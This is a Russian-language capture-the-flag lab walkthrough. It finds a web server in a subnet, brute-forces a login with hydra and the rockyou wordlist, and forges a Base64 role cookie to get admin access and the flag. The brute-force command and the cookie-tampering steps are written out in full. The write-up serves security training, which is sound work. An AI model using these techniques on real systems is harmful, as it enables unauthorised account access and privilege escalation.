1. Поиск веб-сервера
Ваш хост и веб-сервер находятся в одной подсети. Укажите IP-адрес веб-сервера. Целевая сеть: 195.239.174.0/24. Ограничение: Не атаковать адрес 195.239.174.12.

2. Анализ полей авторизации
Из кода страницы авторизации определить поля, использующиеся для авторизации. Укажите имя поля для ввода пароля.

4. Определение типа кодировки cookie auth
Укажите тип кодировки `cookie auth`.

5. Получение флага
Измените данные в запросе аутентификации. Найдите флаг в коде веб-страницы и вставьте его в поле ответа.

# Разведка и решение
Сначала посмотрим доступные ip в сети:
```bash
sudo arp-scan --interface=eth2 195.239.174.0/24
```
Из вывода можем выделить два ip, которые нас интересуют.
```text
195.239.174.12  
195.239.174.13  
195.239.174.15  
```
Проверим открыты ли порты 80,443:
```bash
nmap -p 80,443 195.239.174.12 195.239.174.15 195.239.174.13
```
Вывод:
```text
Nmap scan report for 195.239.174.15
Host is up (0.00024s latency).

PORT    STATE  SERVICE
80/tcp  open   http
443/tcp closed https
MAC Address: 00:50:56:80:05:96 (VMware)

Nmap scan report for 195.239.174.13
Host is up (0.00024s latency).

PORT    STATE  SERVICE
80/tcp  closed http
443/tcp closed https
MAC Address: 00:50:56:80:05:96 (VMware)
```
Проверим с помощью curl какой сервер активный и отзывается только ``195.239.174.15``.
Ответ на 1-ый вопрос нашли:
```text
Поиск веб-сервера
195.239.174.15
```
Видим страницу авторизации. Отправим любые данные в полях авторизиции и перехватим запрос в Burp Suite и посмотрим post параметры в запросе:
```text
login=admin&pass=admin
```
pass - параметр отвечающий за пароль. Это ответ на 2-ой вопрос.
```text
Анализ полей авторизации
pass
```
Дальше с помощью брутфорса подберем пароль от пользователя user.
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt \        
  195.239.174.15 http-post-form \
  "/index.php:login=^USER^&pass=^PASS^:Неверный логин или пароль"
```
Вывод:
```text
login: user   password: calvin
```
Теперь заходим под пользователем user. Это ответ на 3-ий вопрос.
```text
Перебор пароля методом грубой силы
calvin
```
Дальше нам надо определить тип кодировки cookie auth. Перехватим запрос в BurpSuite и посмотрим на cookie. Скопируем их и идем в CyberChef и он автоматически определил, что это Base64. Таким образом нашли ответ на 4-ый вопрос.
```text
Определение типа кодировки cookie auth
Base64
```
Проанализировав cookie видим свою роль user. По идее нам надо ее изменить на admin, чтобы получить доступ к странице. Это можно проделать в CyberChef. Дальше меняем на новую cookie  и обновляем сайт. Доступ получен и мы видим итоговый флаг и ответ на     5-ый вопрос.
```text
Получение флага
eh638
```
